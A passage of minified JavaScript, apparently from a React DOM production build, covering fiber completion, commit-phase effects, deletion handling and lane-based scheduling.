E=="string"?(o!=="textarea"||E!=="")&&ki(t,E):typeof E=="number"&&ki(t,""+E):g!=="suppressContentEditableWarning"&&g!=="suppressHydrationWarning"&&g!=="autoFocus"&&(a.hasOwnProperty(g)?E!=null&&g==="onScroll"&&Re("scroll",t):E!=null&&P(t,g,E,b))}switch(o){case"input":_t(t),yd(t,u,!1);break;case"textarea":_t(t),wd(t);break;case"option":u.value!=null&&t.setAttribute("value",""+xe(u.value));break;case"select":t.multiple=!!u.multiple,g=u.value,g!=null?Er(t,!!u.multiple,g,!1):u.defaultValue!=null&&Er(t,!!u.multiple,u.defaultValue,!0);break;default:typeof h.onClick=="function"&&(t.onclick=no)}switch(o){case"button":case"input":case"select":case"textarea":u=!!u.autoFocus;break e;case"img":u=!0;break e;default:u=!1}}u&&(i.flags|=4)}i.ref!==null&&(i.flags|=512,i.flags|=2097152)}return at(i),null;case 6:if(t&&i.stateNode!=null)Mp(t,i,t.memoizedProps,u);else{if(typeof u!="string"&&i.stateNode===null)throw Error(r(166));if(o=tr(Ki.current),tr(Yt.current),co(i)){if(u=i.stateNode,o=i.memoizedProps,u[Qt]=i,(g=u.nodeValue!==o)&&(t=St,t!==null))switch(t.tag){case 3:to(u.nodeValue,o,(t.mode&1)!==0);break;case 5:t.memoizedProps.suppressHydrationWarning!==!0&&to(u.nodeValue,o,(t.mode&1)!==0)}g&&(i.flags|=4)}else u=(o.nodeType===9?o:o.ownerDocument).createTextNode(u),u[Qt]=i,i.stateNode=u}return at(i),null;case 13:if(De(Me),u=i.memoizedState,t===null||t.memoizedState!==null&&t.memoizedState.dehydrated!==null){if(je&&Tt!==null&&(i.mode&1)!==0&&(i.flags&128)===0)Lh(),Vr(),i.flags|=98560,g=!1;else if(g=co(i),u!==null&&u.dehydrated!==null){if(t===null){if(!g)throw Error(r(318));if(g=i.memoizedState,g=g!==null?g.dehydrated:null,!g)throw Error(r(317));g[Qt]=i}else Vr(),(i.flags&128)===0&&(i.memoizedState=null),i.flags|=4;at(i),g=!1}else Ut!==null&&(gc(Ut),Ut=null),g=!0;if(!g)return i.flags&65536?i:null}return(i.flags&128)!==0?(i.lanes=o,i):(u=u!==null,u!==(t!==null&&t.memoizedState!==null)&&u&&(i.child.flags|=8192,(i.mode&1)!==0&&(t===null||(Me.current&1)!==0?Ke===0&&(Ke=3):bc())),i.updateQueue!==null&&(i.flags|=4),at(i),null);case 4:return qr(),ic(t,i),t===null&&zi(i.stateNode.containerInfo),at(i),null;case 10:return Dl(i.type._context),at(i),null;case 17:return ft(i.type)&&io(),at(i),null;case 19:if(De(Me),g=i.memoizedState,g===null)return at(i),null;if(u=(i.flags&128)!==0,b=g.rendering,b===null)if(u)Zi(g,!1);else{if(Ke!==0||t!==null&&(t.flags&128)!==0)for(t=i.child;t!==null;){if(b=mo(t),b!==null){for(i.flags|=128,Zi(g,!1),u=b.updateQueue,u!==null&&(i.updateQueue=u,i.flags|=4),i.subtreeFlags=0,u=o,o=i.child;o!==null;)g=o,t=u,g.flags&=14680066,b=g.alternate,b===null?(g.childLanes=0,g.lanes=t,g.child=null,g.subtreeFlags=0,g.memoizedProps=null,g.memoizedState=null,g.updateQueue=null,g.dependencies=null,g.stateNode=null):(g.childLanes=b.childLanes,g.lanes=b.lanes,g.child=b.child,g.subtreeFlags=0,g.deletions=null,g.memoizedProps=b.memoizedProps,g.memoizedState=b.memoizedState,g.updateQueue=b.updateQueue,g.type=b.type,t=b.dependencies,g.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext}),o=o.sibling;return Pe(Me,Me.current&1|2),i.child}t=t.sibling}g.tail!==null&&Ue()>Qr&&(i.flags|=128,u=!0,Zi(g,!1),i.lanes=4194304)}else{if(!u)if(t=mo(b),t!==null){if(i.flags|=128,u=!0,o=t.updateQueue,o!==null&&(i.updateQueue=o,i.flags|=4),Zi(g,!0),g.tail===null&&g.tailMode==="hidden"&&!b.alternate&&!je)return at(i),null}else 2*Ue()-g.renderingStartTime>Qr&&o!==1073741824&&(i.flags|=128,u=!0,Zi(g,!1),i.lanes=4194304);g.isBackwards?(b.sibling=i.child,i.child=b):(o=g.last,o!==null?o.sibling=b:i.child=b,g.last=b)}return g.tail!==null?(i=g.tail,g.rendering=i,g.tail=i.sibling,g.renderingStartTime=Ue(),i.sibling=null,o=Me.current,Pe(Me,u?o&1|2:o&1),i):(at(i),null);case 22:case 23:return yc(),u=i.memoizedState!==null,t!==null&&t.memoizedState!==null!==u&&(i.flags|=8192),u&&(i.mode&1)!==0?(At&1073741824)!==0&&(at(i),i.subtreeFlags&6&&(i.flags|=8192)):at(i),null;case 24:return null;case 25:return null}throw Error(r(156,i.tag))}function Tw(t,i){switch(Cl(i),i.tag){case 1:return ft(i.type)&&io(),t=i.flags,t&65536?(i.flags=t&-65537|128,i):null;case 3:return qr(),De(pt),De(st),Fl(),t=i.flags,(t&65536)!==0&&(t&128)===0?(i.flags=t&-65537|128,i):null;case 5:return Nl(i),null;case 13:if(De(Me),t=i.memoizedState,t!==null&&t.dehydrated!==null){if(i.alternate===null)throw Error(r(340));Vr()}return t=i.flags,t&65536?(i.flags=t&-65537|128,i):null;case 19:return De(Me),null;case 4:return qr(),null;case 10:return Dl(i.type._context),null;case 22:case 23:return yc(),null;case 24:return null;default:return null}}var Ao=!1,lt=!1,Aw=typeof WeakSet=="function"?WeakSet:Set,X=null;function Kr(t,i){var o=t.ref;if(o!==null)if(typeof o=="function")try{o(null)}catch(u){Le(t,i,u)}else o.current=null}function sc(t,i,o){try{o()}catch(u){Le(t,i,u)}}var Bp=!1;function Cw(t,i){if(yl=$s,t=fh(),cl(t)){if("selectionStart"in t)var o={start:t.selectionStart,end:t.selectionEnd};else e:{o=(o=t.ownerDocument)&&o.defaultView||window;var u=o.getSelection&&o.getSelection();if(u&&u.rangeCount!==0){o=u.anchorNode;var h=u.anchorOffset,g=u.focusNode;u=u.focusOffset;try{o.nodeType,g.nodeType}catch{o=null;break e}var b=0,S=-1,E=-1,j=0,F=0,z=t,L=null;t:for(;;){for(var Q;z!==o||h!==0&&z.nodeType!==3||(S=b+h),z!==g||u!==0&&z.nodeType!==3||(E=b+u),z.nodeType===3&&(b+=z.nodeValue.length),(Q=z.firstChild)!==null;)L=z,z=Q;for(;;){if(z===t)break t;if(L===o&&++j===h&&(S=b),L===g&&++F===u&&(E=b),(Q=z.nextSibling)!==null)break;z=L,L=z.parentNode}z=Q}o=S===-1||E===-1?null:{start:S,end:E}}else o=null}o=o||{start:0,end:0}}else o=null;for(bl={focusedElem:t,selectionRange:o},$s=!1,X=i;X!==null;)if(i=X,t=i.child,(i.subtreeFlags&1028)!==0&&t!==null)t.return=i,X=t;else for(;X!==null;){i=X;try{var Z=i.alternate;if((i.flags&1024)!==0)switch(i.tag){case 0:case 11:case 15:break;case 1:if(Z!==null){var te=Z.memoizedProps,ze=Z.memoizedState,D=i.stateNode,R=D.getSnapshotBeforeUpdate(i.elementType===i.type?te:zt(i.type,te),ze);D.__reactInternalSnapshotBeforeUpdate=R}break;case 3:var O=i.stateNode.containerInfo;O.nodeType===1?O.textContent="":O.nodeType===9&&O.documentElement&&O.removeChild(O.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(r(163))}}catch($){Le(i,i.return,$)}if(t=i.sibling,t!==null){t.return=i.return,X=t;break}X=i.return}return Z=Bp,Bp=!1,Z}function es(t,i,o){var u=i.updateQueue;if(u=u!==null?u.lastEffect:null,u!==null){var h=u=u.next;do{if((h.tag&t)===t){var g=h.destroy;h.destroy=void 0,g!==void 0&&sc(i,o,g)}h=h.next}while(h!==u)}}function Co(t,i){if(i=i.updateQueue,i=i!==null?i.lastEffect:null,i!==null){var o=i=i.next;do{if((o.tag&t)===t){var u=o.create;o.destroy=u()}o=o.next}while(o!==i)}}function oc(t){var i=t.ref;if(i!==null){var o=t.stateNode;switch(t.tag){case 5:t=o;break;default:t=o}typeof i=="function"?i(t):i.current=t}}function Np(t){var i=t.alternate;i!==null&&(t.alternate=null,Np(i)),t.child=null,t.deletions=null,t.sibling=null,t.tag===5&&(i=t.stateNode,i!==null&&(delete i[Qt],delete i[Wi],delete i[xl],delete i[lw],delete i[cw])),t.stateNode=null,t.return=null,t.dependencies=null,t.memoizedProps=null,t.memoizedState=null,t.pendingProps=null,t.stateNode=null,t.updateQueue=null}function Lp(t){return t.tag===5||t.tag===3||t.tag===4}function Fp(t){e:for(;;){for(;t.sibling===null;){if(t.return===null||Lp(t.return))return null;t=t.return}for(t.sibling.return=t.return,t=t.sibling;t.tag!==5&&t.tag!==6&&t.tag!==18;){if(t.flags&2||t.child===null||t.tag===4)continue e;t.child.return=t,t=t.child}if(!(t.flags&2))return t.stateNode}}function ac(t,i,o){var u=t.tag;if(u===5||u===6)t=t.stateNode,i?o.nodeType===8?o.parentNode.insertBefore(t,i):o.insertBefore(t,i):(o.nodeType===8?(i=o.parentNode,i.insertBefore(t,o)):(i=o,i.appendChild(t)),o=o._reactRootContainer,o!=null||i.onclick!==null||(i.onclick=no));else if(u!==4&&(t=t.child,t!==null))for(ac(t,i,o),t=t.sibling;t!==null;)ac(t,i,o),t=t.sibling}function lc(t,i,o){var u=t.tag;if(u===5||u===6)t=t.stateNode,i?o.insertBefore(t,i):o.appendChild(t);else if(u!==4&&(t=t.child,t!==null))for(lc(t,i,o),t=t.sibling;t!==null;)lc(t,i,o),t=t.sibling}var nt=null,Vt=!1;function In(t,i,o){for(o=o.child;o!==null;)Up(t,i,o),o=o.sibling}function Up(t,i,o){if(Jt&&typeof Jt.onCommitFiberUnmount=="function")try{Jt.onCommitFiberUnmount(Ls,o)}catch{}switch(o.tag){case 5:lt||Kr(o,i);case 6:var u=nt,h=Vt;nt=null,In(t,i,o),nt=u,Vt=h,nt!==null&&(Vt?(t=nt,o=o.stateNode,t.nodeType===8?t.parentNode.removeChild(o):t.removeChild(o)):nt.removeChild(o.stateNode));break;case 18:nt!==null&&(Vt?(t=nt,o=o.stateNode,t.nodeType===8?kl(t.parentNode,o):t.nodeType===1&&kl(t,o),Di(t)):kl(nt,o.stateNode));break;case 4:u=nt,h=Vt,nt=o.stateNode.containerInfo,Vt=!0,In(t,i,o),nt=u,Vt=h;break;case 0:case 11:case 14:case 15:if(!lt&&(u=o.updateQueue,u!==null&&(u=u.lastEffect,u!==null))){h=u=u.next;do{var g=h,b=g.destroy;g=g.tag,b!==void 0&&((g&2)!==0||(g&4)!==0)&&sc(o,i,b),h=h.next}while(h!==u)}In(t,i,o);break;case 1:if(!lt&&(Kr(o,i),u=o.stateNode,typeof u.componentWillUnmount=="function"))try{u.props=o.memoizedProps,u.state=o.memoizedState,u.componentWillUnmount()}catch(S){Le(o,i,S)}In(t,i,o);break;case 21:In(t,i,o);break;case 22:o.mode&1?(lt=(u=lt)||o.memoizedState!==null,In(t,i,o),lt=u):In(t,i,o);break;default:In(t,i,o)}}function zp(t){var i=t.updateQueue;if(i!==null){t.updateQueue=null;var o=t.stateNode;o===null&&(o=t.stateNode=new Aw),i.forEach(function(u){var h=Mw.bind(null,t,u);o.has(u)||(o.add(u),u.then(h,h))})}}function Wt(t,i){var o=i.deletions;if(o!==null)for(var u=0;u<o.length;u++){var h=o[u];try{var g=t,b=i,S=b;e:for(;S!==null;){switch(S.tag){case 5:nt=S.stateNode,Vt=!1;break e;case 3:nt=S.stateNode.containerInfo,Vt=!0;break e;case 4:nt=S.stateNode.containerInfo,Vt=!0;break e}S=S.return}if(nt===null)throw Error(r(160));Up(g,b,h),nt=null,Vt=!1;var E=h.alternate;E!==null&&(E.return=null),h.return=null}catch(j){Le(h,i,j)}}if(i.subtreeFlags&12854)for(i=i.child;i!==null;)Vp(i,t),i=i.sibling}function Vp(t,i){var o=t.alternate,u=t.flags;switch(t.tag){case 0:case 11:case 14:case 15:if(Wt(i,t),Zt(t),u&4){try{es(3,t,t.return),Co(3,t)}catch(te){Le(t,t.return,te)}try{es(5,t,t.return)}catch(te){Le(t,t.return,te)}}break;case 1:Wt(i,t),Zt(t),u&512&&o!==null&&Kr(o,o.return);break;case 5:if(Wt(i,t),Zt(t),u&512&&o!==null&&Kr(o,o.return),t.flags&32){var h=t.stateNode;try{ki(h,"")}catch(te){Le(t,t.return,te)}}if(u&4&&(h=t.stateNode,h!=null)){var g=t.memoizedProps,b=o!==null?o.memoizedProps:g,S=t.type,E=t.updateQueue;if(t.updateQueue=null,E!==null)try{S==="input"&&g.type==="radio"&&g.name!=null&&md(h,g),Fa(S,b);var j=Fa(S,g);for(b=0;b<E.length;b+=2){var F=E[b],z=E[b+1];F==="style"?Td(h,z):F==="dangerouslySetInnerHTML"?xd(h,z):F==="children"?ki(h,z):P(h,F,z,j)}switch(S){case"input":ja(h,g);break;case"textarea":vd(h,g);break;case"select":var L=h._wrapperState.wasMultiple;h._wrapperState.wasMultiple=!!g.multiple;var Q=g.value;Q!=null?Er(h,!!g.multiple,Q,!1):L!==!!g.multiple&&(g.defaultValue!=null?Er(h,!!g.multiple,g.defaultValue,!0):Er(h,!!g.multiple,g.multiple?[]:"",!1))}h[Wi]=g}catch(te){Le(t,t.return,te)}}break;case 6:if(Wt(i,t),Zt(t),u&4){if(t.stateNode===null)throw Error(r(162));h=t.stateNode,g=t.memoizedProps;try{h.nodeValue=g}catch(te){Le(t,t.return,te)}}break;case 3:if(Wt(i,t),Zt(t),u&4&&o!==null&&o.memoizedState.isDehydrated)try{Di(i.containerInfo)}catch(te){Le(t,t.return,te)}break;case 4:Wt(i,t),Zt(t);break;case 13:Wt(i,t),Zt(t),h=t.child,h.flags&8192&&(g=h.memoizedState!==null,h.stateNode.isHidden=g,!g||h.alternate!==null&&h.alternate.memoizedState!==null||(dc=Ue())),u&4&&zp(t);break;case 22:if(F=o!==null&&o.memoizedState!==null,t.mode&1?(lt=(j=lt)||F,Wt(i,t),lt=j):Wt(i,t),Zt(t),u&8192){if(j=t.memoizedState!==null,(t.stateNode.isHidden=j)&&!F&&(t.mode&1)!==0)for(X=t,F=t.child;F!==null;){for(z=X=F;X!==null;){switch(L=X,Q=L.child,L.tag){case 0:case 11:case 14:case 15:es(4,L,L.return);break;case 1:Kr(L,L.return);var Z=L.stateNode;if(typeof Z.componentWillUnmount=="function"){u=L,o=L.return;try{i=u,Z.props=i.memoizedProps,Z.state=i.memoizedState,Z.componentWillUnmount()}catch(te){Le(u,o,te)}}break;case 5:Kr(L,L.return);break;case 22:if(L.memoizedState!==null){Hp(z);continue}}Q!==null?(Q.return=L,X=Q):Hp(z)}F=F.sibling}e:for(F=null,z=t;;){if(z.tag===5){if(F===null){F=z;try{h=z.stateNode,j?(g=h.style,typeof g.setProperty=="function"?g.setProperty("display","none","important"):g.display="none"):(S=z.stateNode,E=z.memoizedProps.style,b=E!=null&&E.hasOwnProperty("display")?E.display:null,S.style.display=Sd("display",b))}catch(te){Le(t,t.return,te)}}}else if(z.tag===6){if(F===null)try{z.stateNode.nodeValue=j?"":z.memoizedProps}catch(te){Le(t,t.return,te)}}else if((z.tag!==22&&z.tag!==23||z.memoizedState===null||z===t)&&z.child!==null){z.child.return=z,z=z.child;continue}if(z===t)break e;for(;z.sibling===null;){if(z.return===null||z.return===t)break e;F===z&&(F=null),z=z.return}F===z&&(F=null),z.sibling.return=z.return,z=z.sibling}}break;case 19:Wt(i,t),Zt(t),u&4&&zp(t);break;case 21:break;default:Wt(i,t),Zt(t)}}function Zt(t){var i=t.flags;if(i&2){try{e:{for(var o=t.return;o!==null;){if(Lp(o)){var u=o;break e}o=o.return}throw Error(r(160))}switch(u.tag){case 5:var h=u.stateNode;u.flags&32&&(ki(h,""),u.flags&=-33);var g=Fp(t);lc(t,g,h);break;case 3:case 4:var b=u.stateNode.containerInfo,S=Fp(t);ac(t,S,b);break;default:throw Error(r(161))}}catch(E){Le(t,t.return,E)}t.flags&=-3}i&4096&&(t.flags&=-4097)}function Ew(t,i,o){X=t,Wp(t)}function Wp(t,i,o){for(var u=(t.mode&1)!==0;X!==null;){var h=X,g=h.child;if(h.tag===22&&u){var b=h.memoizedState!==null||Ao;if(!b){var S=h.alternate,E=S!==null&&S.memoizedState!==null||lt;S=Ao;var j=lt;if(Ao=b,(lt=E)&&!j)for(X=h;X!==null;)b=X,E=b.child,b.tag===22&&b.memoizedState!==null?qp(h):E!==null?(E.return=b,X=E):qp(h);for(;g!==null;)X=g,Wp(g),g=g.sibling;X=h,Ao=S,lt=j}$p(t)}else(h.subtreeFlags&8772)!==0&&g!==null?(g.return=h,X=g):$p(t)}}function $p(t){for(;X!==null;){var i=X;if((i.flags&8772)!==0){var o=i.alternate;try{if((i.flags&8772)!==0)switch(i.tag){case 0:case 11:case 15:lt||Co(5,i);break;case 1:var u=i.stateNode;if(i.flags&4&&!lt)if(o===null)u.componentDidMount();else{var h=i.elementType===i.type?o.memoizedProps:zt(i.type,o.memoizedProps);u.componentDidUpdate(h,o.memoizedState,u.__reactInternalSnapshotBeforeUpdate)}var g=i.updateQueue;g!==null&&Hh(i,g,u);break;case 3:var b=i.updateQueue;if(b!==null){if(o=null,i.child!==null)switch(i.child.tag){case 5:o=i.child.stateNode;break;case 1:o=i.child.stateNode}Hh(i,b,o)}break;case 5:var S=i.stateNode;if(o===null&&i.flags&4){o=S;var E=i.memoizedProps;switch(i.type){case"button":case"input":case"select":case"textarea":E.autoFocus&&o.focus();break;case"img":E.src&&(o.src=E.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(i.memoizedState===null){var j=i.alternate;if(j!==null){var F=j.memoizedState;if(F!==null){var z=F.dehydrated;z!==null&&Di(z)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(r(163))}lt||i.flags&512&&oc(i)}catch(L){Le(i,i.return,L)}}if(i===t){X=null;break}if(o=i.sibling,o!==null){o.return=i.return,X=o;break}X=i.return}}function Hp(t){for(;X!==null;){var i=X;if(i===t){X=null;break}var o=i.sibling;if(o!==null){o.return=i.return,X=o;break}X=i.return}}function qp(t){for(;X!==null;){var i=X;try{switch(i.tag){case 0:case 11:case 15:var o=i.return;try{Co(4,i)}catch(E){Le(i,o,E)}break;case 1:var u=i.stateNode;if(typeof u.componentDidMount=="function"){var h=i.return;try{u.componentDidMount()}catch(E){Le(i,h,E)}}var g=i.return;try{oc(i)}catch(E){Le(i,g,E)}break;case 5:var b=i.return;try{oc(i)}catch(E){Le(i,b,E)}}}catch(E){Le(i,i.return,E)}if(i===t){X=null;break}var S=i.sibling;if(S!==null){S.return=i.return,X=S;break}X=i.return}}var Pw=Math.ceil,Eo=M.ReactCurrentDispatcher,cc=M.ReactCurrentOwner,jt=M.ReactCurrentBatchConfig,we=0,Ze=null,We=null,rt=0,At=0,Jr=An(0),Ke=0,ts=null,rr=0,Po=0,uc=0,ns=null,mt=null,dc=0,Qr=1/0,dn=null,_o=!1,hc=null,Rn=null,Io=!1,Dn=null,Ro=0,rs=0,pc=null,Do=-1,Oo=0;function dt(){return(we&6)!==0?Ue():Do!==-1?Do:Do=Ue()}function On(t){return(t.mode&1)===0?1:(we&2)!==0&&rt!==0?rt&-rt:dw.transition!==null?(Oo===0&&(Oo=Fd()),Oo):(t=Te,t!==0||(t=window.event,t=t===void 0?16:Kd(t.type)),t)}function $t(t,i,o,u){if(50<rs)throw rs=0,pc=null,Error(r(185));Ei(t,o,u),((we&2)===0||t!==Ze)&&(t===Ze&&((we&2)===0&&(Po|=o),Ke===4&&jn(t,rt)),yt(t,u),o===1&&we===0&&(i.mode&1)===0&&(Qr=Ue()+500,oo&&En()))}function yt(t,i){var o=t.callbackNode;dv(t,i);var u=zs(t,t===Ze?rt:0);if(u===0)o!==null&&Bd(o),t.callbackNode=null,t.callbackPriority=0;else if(i=u&-u,t.callbackPriority!==i){if(o!=null&&Bd(o),i===1)t.tag===0?uw(Kp.bind(null,t)):Oh(Kp.bind(null,t)),ow(function(){(we&6)===0&&En()}),o=null;else{switch(Ud(u)){case 1:o=qa;break;case 4:o=Nd;break;case 16:o=Ns;break;case 536870912:o=Ld;break;default:o=Ns}o=nf(o,Gp.bind(null,t))}t.callbackPriority=i,t.callbackNode=o}}function Gp(t,i){if(Do=-1,Oo=0,(we&6)!==0)throw Error(r(327));var o=t.callbackNode;if(Yr()&&t.callbackNode!==o)return null;var u=zs(t,t===Ze?rt:0);if(u===0)return null;if((u&30)!==0||(u&t.expiredLanes)!==0||i)i=jo(t,u);else{i=u;var h=we;we|=2;var g=Qp();(Ze!==t||rt!==i)&&(dn=null,Qr=Ue()+500,sr(t,i));do try{Rw();break}catch(S){Jp(t,S)}while(!0);Rl(),Eo.current=g,we=h,We!==null?i=0:(Ze=null,rt=0,i=Ke)}if(i!==0){if(i===2&&(h=Ga(t),h!==0&&(u=h,i=fc(t,h))),i===1)throw o=ts,sr(t,0),jn(t,u),yt(t,Ue()),o;if(i===6)jn(t,u);else{if(h=t.current.alternate,(u&30)===0&&!_w(h)&&(i=jo(t,u),i===2&&(g=Ga(t),g!==0&&(u=g,i=fc(t,g))),i===1))throw o=ts,sr(t,0),jn(t,u),yt(t,Ue()),o;switch(t.finishedWork=h,t.finishedLanes=u,i){case 0:case 1:throw Error(r(345));case 2:or(t,mt,dn);break;case 3:if(jn(t,u),(u&130023424)===u&&(i=dc+500-Ue(),10<i)){if(zs(t,0)!==0)break;if(h=t.suspendedLanes,(h&u)!==u){dt(),t.pingedLanes|=t.suspendedLanes&h;break}t.timeoutHandle=wl(or.bind(null,t,mt,dn),i);break}or(t,mt,dn);break;case 4:if(jn(t,u),(u&4194240)===u)break;for(i=t.eventTimes,h=-1;0<u;){var b=31-Lt(u);g=1<<b,b=i[b],b>h&&(h=b),u&=~g}if(u=h,u=Ue()-u,u=(120>u?120:480>u?480:1080>u?1080:1920>u?1920:3e3>u?3e3:4320>u?4320:1960*Pw(u/1960))-u,10<u){t.timeoutHandle=wl(or.bind(null,t,mt,dn),u);break}or(t,mt,dn);break;case 5:or(t,mt,dn);break;default:throw Error(r(329))}}}return yt(t,Ue()),t.callbackNode===o?Gp.bind(null,t):null}function fc(t,i){var o=ns;return t.current.memoizedState.isDehydrated&&(sr(t,i).flags|=256),t=jo(t,i),t!==2&&(i=mt,mt=o,i!==null&&gc(i)),t}function gc(t){mt===null?mt=t:mt.push.apply(mt,t)}function _w(t){for(var i=t;;){if(i.flags&16384){var o=i.updateQueue;if(o!==null&&(o=o.stores,o!==null))for(var u=0;u<o.length;u++){var h=o[u],g=h.getSnapshot;h=h.value;try{if(!Ft(g(),h))return!1}catch{return!1}}}if(o=i.child,i.subtreeFlags&16384&&o!==null)o.return=i,i=o;else{if(i===t)break;for(;i.sibling===null;){if(i.return===null||i.return===t)return!0;i=i.return}i.sibling.return=i.return,i=i.sibling}}return!0}function jn(t,i){for(i&=~uc,i&=~Po,t.suspendedLanes|=i,t.pingedLanes&=~i,t=t.expirationTimes;0<i;){var o=31-Lt(i),u=1<<o;t[o]=-1,i&=~u}}function Kp(t){if((we&6)!==0)throw Error(r(327));Yr();var i=zs(t,0);if((i&1)===0)return yt(t,Ue()),null;var o=jo(t,i);if(t.tag!==0&&o===2){var u=Ga(t);u!==0&&(i=u,o=fc(t,u))}if(o===1)throw o=ts,sr(t,0),jn(t,i),yt(t,Ue()),o;if(o===6)throw Error(r(345));return t.finishedWork=t.current.alternate,t.finishedLanes=i,or(t,mt,dn),yt(t,Ue()),null}function mc(t,i){var o=we;we|=1;try{return t(i)}finally{we=o,we===0&&(Qr=Ue()+500,oo&&En())}}function ir(t){Dn!==null&&Dn.tag===0&&(we&6)===0&&Yr();var i=we;we|=1;var o=jt.transition,u=Te;try{if(jt.transition=null,Te=1,t)return t()}finally{Te=u,jt.transition=o,we=i,(we&6)===0&&En()}}function yc(){At=Jr.current,De(Jr)}function sr(t,i){t.finishedWork=null,t.finishedLanes=0;var o=t.timeoutHandle;if(o!==-1&&(t.timeoutHandle=-1,sw(o)),We!==null)for(o=We.return;o!==null;){var u=o;switch(Cl(u),u.tag){case 1:u=u.type.childContextTypes,u!=null&&io();break;case 3:qr(),De(pt),De(st),Fl();break;case 5:Nl(u);break;case 4:qr();break;case 13:De(Me);break;case 19:De(Me);break;case 10:Dl(u.type._context);break;case 22:case 23:yc()}o=o.return}if(Ze=t,We=t=Mn(t.current,null),rt=At=i,Ke=0,ts=null,uc=Po=rr=0,mt=ns=null,er!==null){for(i=0;i<er.length;i++)if(o=er[i],u=o.interleaved,u!==null){o.interleaved=null;var h=u.next,g=o.pending;if(g!==null){var b=g.next;g.next=h,u.next=b}o.pending=u}er=null}return t}function Jp(t,i){do{var o=We;try{if(Rl(),yo.current=ko,bo){for(var u=Be.memoizedState;u!==null;){var h=u.queue;h!==null&&(h.pending=null),u=u.next}bo=!1}if(nr=0,Xe=Ge=Be=null,Ji=!1,Qi=0,cc.current=null,o===null||o.return===null){Ke=1,ts=i,We=null;break}e:{var g=t,b=o.return,S=o,E=i;if(i=rt,S.flags|=32768,E!==null&&typeof E=="object"&&typeof E.then=="function"){var j=E,F=S,z=F.tag;if((F.mode&1)===0&&(z===0||z===11||z===15)){var L=F.alternate;L?(F.updateQueue=L.updateQueue,F.memoizedState=L.memoizedState,F.lanes=L.lanes):(F.updateQueue=null,F.memoizedState=null)}var Q=wp(b);if(Q!==null){Q.flags&=-257,kp(Q,b,S,g,i),Q.mode&1&&vp(g,j,i),i=Q,E=j;var Z=i.updateQueue;if(Z===null){var te=new Set;te.add(E),i.updateQueue=te}else Z.add(E);break e}else{if((i&1)===0){vp(g,j,i),bc();break e}E=Error(r(426))}}else if(je&&S.mode&1){var ze=wp(b);if(ze!==null){(ze.flags&65536)===0&&(ze.flags|=256),kp(ze,b,S,g,i),_l(Gr(E,S));break e}}g=E=Gr(E,S),Ke!==4&&(Ke=2),ns===null?ns=[g]:ns.push(g),g=b;do{switch(g.tag){case 3:g.flags|=65536,i&=-i,g.lanes|=i;var D=yp(g,E,i);$h(g,D);break e;case 1:S=E;var R=g.type,O=g.stateNode;if((g.flags&128)===0&&(typeof R.getDerivedStateFromError=="function"||O!==null&&typeof O.componentDidCatch=="function"&&(Rn===null||!Rn.has(O)))){g.flags|=65536,i&=-i,g.lanes|=i;var $=bp(g,S,i);$h(g,$);break e}}g=g.return}while(g!==null)}Xp(o)}catch(re){i=re,We===o&&o!==null&&(We=o=o.return);continue}break}while(!0)}function Qp(){var t=Eo.current;return Eo.current=ko,t===null?ko:t}function bc(){(Ke===0||Ke===3||Ke===2)&&(Ke=4),Ze===null||(rr&268435455)===0&&(Po&268435455)===0||jn(Ze,rt)}function jo(t,i){var o=we;we|=2;var u=Qp();(Ze!==t||rt!==i)&&(dn=null,sr(t,i));do try{Iw();break}catch(h){Jp(t,h)}while(!0);if(Rl(),we=o,Eo.current=u,We!==null)throw Error(r(261));return Ze=null,rt=0,Ke}function Iw(){for(;We!==null;)Yp(We)}function Rw(){for(;We!==null&&!nv();)Yp(We)}function Yp(t){var i=tf(t.alternate,t,At);t.memoizedProps=t.pendingProps,i===null?Xp(t):We=i,cc.current=null}function Xp(t){var i=t;do{var o=i.alternate;if(t=i.return,(i.flags&32768)===0){if(o=Sw(o,i,At),o!==null){We=o;return}}else{if(o=Tw(o,i),o!==null){o.flags&=32767,We=o;return}if(t!==null)t.flags|=32768,t.subtreeFlags=0,t.deletions=null;else{Ke=6,We=null;return}}if(i=i.sibling,i!==null){We=i;return}We=i=t}while(i!==null);Ke===0&&(Ke=5)}function or(t,i,o){var u=Te,h=jt.transition;try{jt.transition=null,Te=1,Dw(t,i,o,u)}finally{jt.transition=h,Te=u}return null}function Dw(t,i,o,u){do Yr();while(Dn!==null);if((we&6)!==0)throw Error(r(327));o=t.finishedWork;var h=t.finishedLanes;if(o===null)return null;if(t.finishedWork=null,t.finishedLanes=0,o===t.current)throw Error(r(177));t.callbackNode=null,t.callbackPriority=0;var g=o.lanes|o.childLanes;if(hv(t,g),t===Ze&&(We=Ze=null,rt=0),(o.subtreeFlags&2064)===0&&(o.flags&2064)===0||Io||(Io=!0,nf(Ns,function(){return Yr(),null})),g=(o.flags&15990)!==0,(o.subtreeFlags&15990)!==0||g){g=jt.transition,jt.transition=null;var b=Te;Te=1;var S=we;we|=4,cc.current=null,Cw(t,o),Vp(o,t),Xv(bl),$s=!!yl,bl=yl=null,t.current=o,Ew(o),rv(),we=S,Te=b,jt.transition=g}else t.current=o;if(Io&&(Io=!1,Dn=t,Ro=h),g=t.pendingLanes,g===0&&(Rn=null),ov(o.stateNode),yt(t,Ue()),i!==null)for(u=t.onRecoverableError,o=0;o<i.length;o++)h=i[o],u(h.value,{componentStack:h.stack,digest:h.digest});if(_o)throw _o=!1,t=hc,hc=null,t;return(Ro&1)!==0&&t.tag!==0&&Yr(),g=t.pendingLanes,(g&1)!==0?t===pc?rs++:(rs=0,pc=t):rs=0,En(),null}function Yr(){if(Dn!==null){var t=Ud(Ro),i=jt.transition,o=Te;try{if(jt.transition=null,Te=16>t?16:t,Dn===null)var u=!1;else{if(t=Dn,Dn=null,Ro=0,(we&6)!==0)throw Error(r(331));var h=we;for(we|=4,X=t.current;X!==null;){var g=X,b=g.child;if((X.flags&16)!==0){var S=g.deletions;if(S!==null){for(var E=0;E<S.length;E++){var j=S[E];for(X=j;X!==null;){var F=X;switch(F.tag){case 0:case 11:case 15:es(8,F,g)}var z=F.child;if(z!==null)z.return=F,X=z;else for(;X!==null;){F=X;var L=F.sibling,Q=F.return;if(Np(F),F===j){X=null;break}if(L!==null){L.return=Q,X=L;break}X=Q}}}var Z=g.alternate;if(Z!==null){var te=Z.child;if(te!==null){Z.child=null;do{var ze=te.sibling;te.sibling=null,te=ze}while(te!==null)}}X=g}}if((g.subtreeFlags&2064)!==0&&b!==null)b.return=g,X=b;else 